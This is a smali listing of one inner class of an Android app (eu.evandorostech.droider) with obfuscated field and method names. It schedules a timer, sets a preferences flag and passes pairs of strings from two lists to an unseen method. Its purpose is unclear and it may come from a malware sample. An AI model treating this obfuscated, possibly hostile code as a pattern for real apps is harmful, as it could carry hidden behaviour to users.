.class Leu/evandorostech/droider/ClassAct$5;
.super Ljava/lang/Object;
.source "ClassAct.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Leu/evandorostech/droider/ClassAct;->f9()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Leu/evandorostech/droider/ClassAct;


# direct methods
.method constructor <init>(Leu/evandorostech/droider/ClassAct;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Leu/evandorostech/droider/ClassAct$5;->this$0:Leu/evandorostech/droider/ClassAct;

    .line 474
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    .prologue
    const-wide/32 v2, 0x9c40

    .line 477
    iget-object v0, p0, Leu/evandorostech/droider/ClassAct$5;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v0, v0, Leu/evandorostech/droider/ClassAct;->q5:Ljava/util/ArrayList;

    if-eqz v0, :cond_0

    .line 478
    iget-object v0, p0, Leu/evandorostech/droider/ClassAct$5;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v0, v0, Leu/evandorostech/droider/ClassAct;->q5:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v0

    if-lez v0, :cond_0

    .line 481
    iget-object v0, p0, Leu/evandorostech/droider/ClassAct$5;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v0, v0, Leu/evandorostech/droider/ClassAct;->timer:Ljava/util/Timer;

    new-instance v1, Leu/evandorostech/droider/ClassAct$UpdateBallTask;

    iget-object v4, p0, Leu/evandorostech/droider/ClassAct$5;->this$0:Leu/evandorostech/droider/ClassAct;

    invoke-direct {v1, v4}, Leu/evandorostech/droider/ClassAct$UpdateBallTask;-><init>(Leu/evandorostech/droider/ClassAct;)V

    move-wide v4, v2

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->scheduleAtFixedRate(Ljava/util/TimerTask;JJ)V

    .line 482
    iget-object v0, p0, Leu/evandorostech/droider/ClassAct$5;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v0, v0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    const-string v1, "ESLIABONENTTUPIT"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v8

    .line 483
    .local v8, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    .line 484
    .local v6, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v0, "countimer"

    const/4 v1, 0x1

    invoke-interface {v6, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 485
    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 487
    const/4 v7, 0x0

    .local v7, "i":I
    :goto_0
    iget-object v0, p0, Leu/evandorostech/droider/ClassAct$5;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v0, v0, Leu/evandorostech/droider/ClassAct;->q5:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v0

    if-lt v7, v0, :cond_1

    .line 492
    .end local v6    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v7    # "i":I
    .end local v8    # "settings":Landroid/content/SharedPreferences;
    :cond_0
    return-void

    .line 489
    .restart local v6    # "editor":Landroid/content/SharedPreferences$Editor;
    .restart local v7    # "i":I
    .restart local v8    # "settings":Landroid/content/SharedPreferences;
    :cond_1
    iget-object v1, p0, Leu/evandorostech/droider/ClassAct$5;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v0, p0, Leu/evandorostech/droider/ClassAct$5;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v0, v0, Leu/evandorostech/droider/ClassAct;->q4:Ljava/util/ArrayList;

    invoke-virtual {v0, v7}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v2

    iget-object v0, p0, Leu/evandorostech/droider/ClassAct$5;->this$0:Leu/evandorostech/droider/ClassAct;

    iget-object v0, v0, Leu/evandorostech/droider/ClassAct;->q5:Ljava/util/ArrayList;

    invoke-virtual {v0, v7}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Leu/evandorostech/droider/ClassAct;->f11(Ljava/lang/String;Ljava/lang/String;)V

    .line 487
    add-int/lit8 v7, v7, 0x1

    goto :goto_0
.end method
